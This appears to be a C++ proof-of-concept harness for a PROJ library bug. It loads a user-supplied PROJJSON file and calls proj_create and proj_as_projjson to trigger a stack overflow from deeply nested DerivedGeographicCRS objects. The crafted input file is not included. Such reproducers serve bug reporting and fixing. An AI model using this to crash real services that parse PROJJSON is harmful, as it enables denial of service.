// SF01 PoC: PROJJSON parsing creates deep DerivedGeographicCRS, then JSON export causes stack overflow
#include <cstring>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <sstream>
extern "C" {
#include "proj.h"
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <json_file>" << std::endl;
        return 1;
    }

    std::ifstream f(argv[1]);
    std::ostringstream ss;
    ss << f.rdbuf();
    std::string json_str = ss.str();
    
    std::cout << "JSON length: " << json_str.size() << " bytes" << std::endl;

    PJ_CONTEXT *ctx = proj_context_create();
    
    std::cout << "Creating object from JSON..." << std::endl;
    PJ *obj = proj_create(ctx, json_str.c_str());
    if (!obj) {
        std::cerr << "proj_create failed" << std::endl;
        proj_context_destroy(ctx);
        return 1;
    }
    
    std::cout << "Object created. Exporting to PROJJSON..." << std::endl;
    const char *out_json = proj_as_projjson(ctx, obj, nullptr);
    if (out_json) {
        std::cout << "JSON export OK, length=" << strlen(out_json) << std::endl;
    } else {
        std::cout << "proj_as_projjson returned null" << std::endl;
    }
    
    proj_destroy(obj);
    proj_context_destroy(ctx);
    std::cout << "Done." << std::endl;
    return 0;
}
